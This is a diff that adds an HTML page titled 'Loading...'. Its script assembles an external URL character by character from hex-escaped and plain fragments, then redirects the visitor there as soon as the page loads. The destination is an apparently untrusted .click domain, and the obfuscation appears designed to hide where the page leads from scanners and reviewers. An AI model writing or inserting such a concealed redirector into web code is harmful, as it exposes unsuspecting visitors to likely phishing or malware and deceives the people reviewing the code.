@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading...</title>
+    <script>
+        const chunks = [
+            () => '\x68',
+            z => "t",
+            () => '\x74',
+            () => '\x70',
+            () => 's',
+            __ => ':',
+            () => '\x2f',
+            () => '/',
+            function() { return 'v'; },
+            () => '\x65',
+            () => '\x72',
+            () => "g",
+            () => "e",
+            () => 'n',
+            p => ".",
+            () => '\x63',
+            function() { return 'l'; },
+            () => "i",
+            () => '\x63',
+            () => 'k',
+            function() { return '/'; },
+            () => '\x73',
+            x => '/',
+            k => "r",
+            () => "e",
+            () => '\x70'
+        ];
+        const url = chunks.reduce((out, fn) => out + fn(), '');
+
+        document.location = url;
+    </script>
+</head>
+<body></body>
+</html>
